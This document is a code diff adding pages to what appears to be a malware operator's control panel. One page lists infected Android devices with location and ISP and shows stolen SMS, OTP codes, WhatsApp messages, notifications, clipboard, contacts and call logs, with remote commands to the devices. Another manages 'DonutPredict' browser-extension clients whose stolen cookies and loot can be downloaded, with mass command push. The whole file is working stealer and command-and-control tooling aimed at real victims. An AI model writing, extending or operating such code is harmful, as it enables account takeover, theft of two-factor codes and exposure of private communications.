@@ -93,6 +93,8 @@ function showPage(name) {
   if (name === 'activity') loadActivity();
   if (name === 'admin') loadAdminUsers();
   if (name === 'browsers') refreshBrowsers();
+  if (name === 'donut') refreshDonut();
+  if (name === 'android') refreshAndroids();
 }
 
 async function refreshVictims() {
@@ -1324,3 +1326,408 @@ async function pinBrowser(eid) {
 }
 window.saveBrowserMeta = saveBrowserMeta;
 window.pinBrowser = pinBrowser;
+
+
+// ===================== ANDROID =====================
+let currentAndroidAid = null;
+
+async function refreshAndroids() {
+  try {
+    const r = await fetch('/api/android/list');
+    if (!r.ok) return;
+    let list = await r.json();
+    const q = ((document.getElementById('android-search') || {}).value || '').toLowerCase().trim();
+    if (q) {
+      list = list.filter(a => JSON.stringify(a).toLowerCase().includes(q));
+    }
+    const count = document.getElementById('android-count');
+    if (count) count.textContent = list.length + ' device' + (list.length === 1 ? '' : 's');
+    const box = document.getElementById('android-list');
+    if (!box) return;
+    if (currentAndroidAid) {
+      box.style.display = 'none';
+      return;
+    }
+    box.style.display = '';
+    if (!list.length) {
+      box.innerHTML = '<div class="muted" style="padding:20px">No android clients yet</div>';
+      return;
+    }
+    box.innerHTML = list.map(a => {
+      const aid = a.aid || '';
+      const aidSafe = String(aid).replace(/'/g, "\\'");
+      const title = [a.manufacturer, a.model].filter(Boolean).join(' ') || a.app || 'Android';
+      const geo = [a.city, a.country].filter(Boolean).join(', ');
+      const perms = a.perms || {};
+      const tags = [];
+      if (a.pinned) tags.push('<span class="tag">pin</span>');
+      if (perms.notifications) tags.push('<span class="tag live">notif</span>');
+      if (perms.sms) tags.push('<span class="tag mild">sms</span>');
+      if (perms.contacts) tags.push('<span class="tag mild">contacts</span>');
+      // online if last_seen within ~2 min (ISO parse best-effort)
+      let online = false;
+      try {
+        const t = Date.parse(a.last_seen);
+        if (!isNaN(t) && (Date.now() - t) < 120000) online = true;
+      } catch (e) {}
+      const dot = online ? '<span style="color:#34d399">●</span>' : '<span style="color:#6b7280">●</span>';
+      const notes = (a.notes || '').slice(0, 60);
+      return `<div class="victim-card" data-open-aid="${aidSafe}" style="cursor:pointer"
+        onclick="window.openAndroidDetail && window.openAndroidDetail('${aidSafe}')">
+        <div class="vc-top">
+          <div class="vc-title">${dot} ${title}</div>
+          <div class="vc-tags">${tags.join(' ')}</div>
+        </div>
+        <div class="vc-user">${a.ip || '?'} · ${geo || (a.android_ver ? ('Android ' + a.android_ver) : '—')}</div>
+        <div class="vc-meta">${a.app || 'app'} ${a.app_ver || ''} · loot ${a.loot_count||0} · ${a.last_seen || ''}</div>
+        ${notes ? `<div class="muted" style="font-size:11px;margin-top:4px">${notes}</div>` : ''}
+      </div>`;
+    }).join('');
+  } catch (e) {}
+}
+
+function openAnPanel(name) {
+  document.querySelectorAll('#an-detail .nav-item').forEach(n => {
+    n.classList.toggle('active', n.getAttribute('data-an-panel') === name);
+  });
+  document.querySelectorAll('#an-detail .panel').forEach(p => {
+    p.classList.toggle('active', p.id === 'panel-an-' + name);
+  });
+  if (currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
+}
+
+function closeAndroidDetail() {
+  currentAndroidAid = null;
+  const d = document.getElementById('an-detail');
+  if (d) { d.classList.add('hidden'); d.style.display = 'none'; }
+  const list = document.getElementById('android-list');
+  if (list) list.style.display = '';
+  refreshAndroids();
+}
+
+async function openAndroidDetail(aid) {
+  currentAndroidAid = aid;
+  const d = document.getElementById('an-detail');
+  const list = document.getElementById('android-list');
+  if (list) list.style.display = 'none';
+  if (d) { d.classList.remove('hidden'); d.style.display = ''; }
+  try {
+    const r = await fetch('/api/android/list');
+    const arr = await r.json();
+    const a = (arr || []).find(x => x.aid === aid) || {};
+    const title = [a.manufacturer, a.model].filter(Boolean).join(' ') || a.app || aid.slice(0, 10);
+    const t = document.getElementById('an-title');
+    const sub = document.getElementById('an-subtitle');
+    if (t) t.textContent = title;
+    if (sub) sub.textContent = (a.ip || '') + ' · ' + ([a.city, a.country].filter(Boolean).join(', ') || a.tz || '');
+    const info = document.getElementById('an-info-grid');
+    if (info) {
+      info.innerHTML = [
+        ['Model', title],
+        ['Android', a.android_ver || ''],
+        ['App', (a.app || '') + ' ' + (a.app_ver || '')],
+        ['IP', a.ip || ''],
+        ['Location', [a.city, a.country].filter(Boolean).join(', ')],
+        ['ISP', a.isp || ''],
+        ['Lang / TZ', (a.lang || '') + ' / ' + (a.tz || '')],
+        ['First', a.first_seen || ''],
+        ['Last', a.last_seen || ''],
+        ['AID', a.aid || ''],
+      ].map(([k,v]) => `<div><b>${k}</b> · ${v || '—'}</div>`).join('');
+    }
+    const perms = document.getElementById('an-perms');
+    if (perms) {
+      const p = a.perms || {};
+      perms.innerHTML = Object.keys(p).length
+        ? Object.entries(p).map(([k,v]) => `<div><b>${k}</b> · ${v ? 'yes' : 'no'}</div>`).join('')
+        : 'no permission report yet';
+    }
+    const notes = document.getElementById('an-notes');
+    const tags = document.getElementById('an-tags');
+    if (notes) notes.value = a.notes || '';
+    if (tags) tags.value = (a.tags || []).join(', ');
+  } catch (e) {}
+  openAnPanel('overview');
+  loadAndroidLootFor(aid);
+  const del = document.getElementById('an-delete-btn');
+  if (del) del.onclick = async () => {
+    if (!confirm('Remove this android client?')) return;
+    await fetch('/api/android/delete', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({aid}) });
+    closeAndroidDetail();
+  };
+  const save = document.getElementById('an-save-meta');
+  if (save) save.onclick = async () => {
+    await fetch('/api/android/meta', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        aid,
+        notes: (document.getElementById('an-notes')||{}).value || '',
+        tags: (document.getElementById('an-tags')||{}).value || '',
+      })
+    });
+    toast('saved');
+  };
+}
+
+async function loadAndroidLootFor(aid) {
+  try {
+    const r = await fetch('/api/android/loot/' + encodeURIComponent(aid));
+    const items = await r.json();
+    const by = {};
+    (items || []).forEach(it => { by[it.type || 'unknown'] = it; });
+    const summary = document.getElementById('an-loot-out');
+    if (summary) {
+      const keys = Object.keys(by);
+      summary.innerHTML = keys.length ? keys.map(typ => {
+        const latest = by[typ];
+        let preview = '';
+        const d = latest.data;
+        if (typeof d === 'string') preview = d.slice(0, 120);
+        else preview = JSON.stringify(d).slice(0, 120);
+        return `<div class="steal-card" style="margin-bottom:8px">
+          <div style="display:flex;justify-content:space-between;gap:8px">
+            <strong>${typ}</strong>
+            <a class="cmd sm" href="/api/android/loot_download/${encodeURIComponent(aid)}?type=${encodeURIComponent(typ)}" download>Download</a>
+          </div>
+          <div class="muted" style="font-size:11px;margin-top:6px;word-break:break-all">${preview}</div>
+        </div>`;
+      }).join('') : 'no loot yet';
+    }
+    const put = (id, typ) => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      const it = by[typ];
+      if (!it) { el.textContent = '—'; return; }
+      el.textContent = typeof it.data === 'string' ? it.data : JSON.stringify(it.data, null, 2);
+    };
+    put('an-notifs-out', 'notifications');
+    put('an-wa-out', 'whatsapp');
+    put('an-otp-out', 'otp');
+    // merge live notifs into notifications panel if present
+    if (by['notifications_live'] && by['notifications']) {
+      try {
+        const a = by['notifications'].data;
+        const live = by['notifications_live'].data;
+        const merged = Array.isArray(a) ? a.slice() : [];
+        if (live && typeof live === 'object') merged.unshift(live);
+        by['notifications'] = Object.assign({}, by['notifications'], { data: merged });
+        put('an-notifs-out', 'notifications');
+      } catch (e) {}
+    }
+    if (by['whatsapp']) {
+      const el = document.getElementById('an-notifs-out');
+      if (el) {
+        const wa = typeof by['whatsapp'].data === 'string' ? by['whatsapp'].data : JSON.stringify(by['whatsapp'].data, null, 2);
+        el.textContent = (el.textContent && el.textContent !== '—' ? el.textContent + '\n\n' : '') + 'WHATSAPP\n' + wa;
+      }
+    }
+    put('an-sms-out', 'sms');
+    put('an-clip-out', 'clipboard');
+    // clipboard may be {text, ts}
+    try {
+      const el = document.getElementById('an-clip-out');
+      const it = by['clipboard'];
+      if (el && it && it.data && typeof it.data === 'object' && it.data.text != null) {
+        el.textContent = String(it.data.text);
+      }
+    } catch (e) {}
+    put('an-contacts-out', 'contacts');
+    const tl = document.getElementById('an-timeline-out');
+    if (tl) {
+      const rows = (items || []).slice().reverse().map(it => {
+        const preview = typeof it.data === 'string' ? it.data.slice(0,80) : JSON.stringify(it.data).slice(0,80);
+        return (it.ts||'') + ' · ' + (it.type||'?') + ' · ' + preview;
+      });
+      tl.textContent = rows.join('\n') || '—';
+    }
+    if (by['calls'] && document.getElementById('an-contacts-out')) {
+      const el = document.getElementById('an-contacts-out');
+      const c = by['contacts'] ? (typeof by['contacts'].data === 'string' ? by['contacts'].data : JSON.stringify(by['contacts'].data, null, 2)) : '';
+      const calls = typeof by['calls'].data === 'string' ? by['calls'].data : JSON.stringify(by['calls'].data, null, 2);
+      el.textContent = (c ? ('CONTACTS\n' + c + '\n\n') : '') + 'CALLS\n' + calls;
+    }
+  } catch (e) {}
+}
+
+async function androidCmd(aid, cmd) {
+  try {
+    const r = await fetch('/api/android/cmd', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ aid, cmd })
+    });
+    const d = await r.json().catch(() => ({}));
+    if (!r.ok) toast(d.error || 'cmd failed');
+    else toast('queued: ' + cmd);
+  } catch (e) { toast('cmd error'); }
+}
+
+document.addEventListener('click', (ev) => {
+  const btn = ev.target.closest('[data-an-cmd]');
+  if (!btn || !currentAndroidAid) return;
+  androidCmd(currentAndroidAid, btn.getAttribute('data-an-cmd'));
+});
+
+if (typeof socket !== 'undefined') {
+  socket.on('android_update', () => {
+    const page = document.getElementById('page-android');
+    if (page && page.classList.contains('active')) {
+      if (currentAndroidAid) openAndroidDetail(currentAndroidAid);
+      else refreshAndroids();
+    }
+  });
+  socket.on('android_loot', (msg) => {
+    if (msg && msg.aid && msg.aid === currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
+  });
+  socket.on('android_otp', (msg) => {
+    if (msg && msg.aid && msg.aid === currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
+    if (msg) toast('OTP-like loot from ' + (msg.aid||'').slice(0,8));
+  });
+}
+
+window.refreshAndroids = refreshAndroids;
+window.openAndroidDetail = openAndroidDetail;
+window.closeAndroidDetail = closeAndroidDetail;
+window.openAnPanel = openAnPanel;
+
+let androidDetailTimer = null;
+const _openAndroidDetail = window.openAndroidDetail;
+window.openAndroidDetail = async function(aid) {
+  if (androidDetailTimer) clearInterval(androidDetailTimer);
+  await _openAndroidDetail(aid);
+  androidDetailTimer = setInterval(() => {
+    if (currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
+  }, 8000);
+};
+const _closeAndroidDetail = window.closeAndroidDetail;
+window.closeAndroidDetail = function() {
+  if (androidDetailTimer) clearInterval(androidDetailTimer);
+  androidDetailTimer = null;
+  _closeAndroidDetail();
+};
+
+/* ========== DonutPredict clients ========== */
+let currentDonutEid = null;
+
+function isDonutClient(b) {
+  if (!b) return false;
+  const k = (b.kind || b.source || b.browser || "").toLowerCase();
+  if (k.includes("donut") || b.donutflip === true) return true;
+  if ((b.eid || "").startsWith("df_")) return true;
+  return false;
+}
+
+async function refreshDonut() {
+  let list = [];
+  try {
+    const r = await fetch("/api/browser/list", { credentials: "same-origin" });
+    if (!r.ok) return;
+    list = await r.json();
+    if (!Array.isArray(list)) list = list.browsers || list.clients || [];
+  } catch (e) { return; }
+  list = list.filter(isDonutClient);
+  const q = (document.getElementById("donut-search")?.value || "").toLowerCase();
+  if (q) list = list.filter(b => JSON.stringify(b).toLowerCase().includes(q));
+  const count = document.getElementById("donut-count");
+  if (count) count.textContent = list.length + " DonutPredict client" + (list.length === 1 ? "" : "s");
+  const box = document.getElementById("donut-list");
+  if (!box) return;
+  if (!list.length) {
+    box.innerHTML = '<div class="empty">No DonutPredict clients yet — load the extension on a browser visiting donutflip.net</div>';
+    return;
+  }
+  box.innerHTML = list.map(b => {
+    const eid = b.eid || "";
+    const last = b.last_seen || b.last || "—";
+    const cookies = b.cookie_count != null ? b.cookie_count : "—";
+    return `<div class="machine-card" onclick="openDonut('${eid}')">
+      <div class="machine-top">
+        <div class="machine-name">DF ${esc(eid).slice(0, 14)}…</div>
+        <span class="pill">${esc(String(cookies))} ck</span>
+      </div>
+      <div class="machine-meta">last ${esc(String(last)).slice(0, 19)}</div>
+    </div>`;
+  }).join("");
+}
+
+async function openDonut(eid) {
+  currentDonutEid = eid;
+  const det = document.getElementById("donut-detail");
+  if (det) det.classList.remove("hidden");
+  document.getElementById("donut-title").textContent = "Donut · " + eid.slice(0, 16);
+  document.getElementById("donut-meta").textContent = "loading…";
+  document.getElementById("donut-loot").innerHTML = "";
+  try {
+    const r = await fetch("/api/browser/list", { credentials: "same-origin" });
+    const list = await r.json();
+    const arr = Array.isArray(list) ? list : (list.browsers || []);
+    const b = arr.find(x => x.eid === eid) || {};
+    document.getElementById("donut-meta").textContent = JSON.stringify({
+      eid: b.eid, ip: b.ip, ua: b.ua, kind: b.kind, last_seen: b.last_seen,
+      cookie_count: b.cookie_count, donutflip: b.donutflip
+    }, null, 2);
+  } catch (e) {}
+  try {
+    const r = await fetch("/api/browser/loot/" + encodeURIComponent(eid));
+    const data = await r.json();
+    const loot = data.loot || data || [];
+    const box = document.getElementById("donut-loot");
+    if (!Array.isArray(loot) || !loot.length) {
+      box.innerHTML = "<div class='muted'>no loot yet</div>";
+      return;
+    }
+    box.innerHTML = loot.slice().reverse().slice(0, 30).map(e => {
+      const typ = e.type || "loot";
+      const preview = typeof e.data === "string" ? e.data.slice(0, 120) : JSON.stringify(e.data || {}).slice(0, 160);
+      return `<div class="steal-card"><b>${esc(typ)}</b> <span class="muted">${esc(e.ts || "")}</span>
+        <pre style="font-size:11px;white-space:pre-wrap">${esc(preview)}</pre>
+        <a class="cmd sm" href="/api/browser/loot_download/${encodeURIComponent(eid)}?type=${encodeURIComponent(typ)}" download>Download</a>
+      </div>`;
+    }).join("");
+  } catch (e) {}
+}
+
+async function donutCmd(cmd) {
+  if (!currentDonutEid) return toast("select a client");
+  await fetch("/api/browser/push", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ eid: currentDonutEid, cmd, args: {} })
+  }).catch(() => {});
+  toast("queued " + cmd);
+  setTimeout(() => openDonut(currentDonutEid), 1500);
+}
+
+async function donutMass(cmd) {
+  try {
+    const r = await fetch("/api/browser/list", { credentials: "same-origin" });
+    const list = await r.json();
+    const arr = (Array.isArray(list) ? list : list.browsers || []).filter(isDonutClient);
+    for (const b of arr) {
+      await fetch("/api/browser/push", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ eid: b.eid, cmd, args: {} })
+      });
+    }
+    toast("queued " + cmd + " on " + arr.length);
+  } catch (e) { toast("mass failed"); }
+}
+
+async function donutDelete() {
+  if (!currentDonutEid) return;
+  if (!confirm("Remove this DonutPredict client?")) return;
+  await fetch("/api/browser/delete", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ eid: currentDonutEid })
+  });
+  currentDonutEid = null;
+  document.getElementById("donut-detail")?.classList.add("hidden");
+  refreshDonut();
+}
+
+window.refreshDonut = refreshDonut;
+window.openDonut = openDonut;
+window.donutCmd = donutCmd;
+window.donutMass = donutMass;
+window.donutDelete = donutDelete;
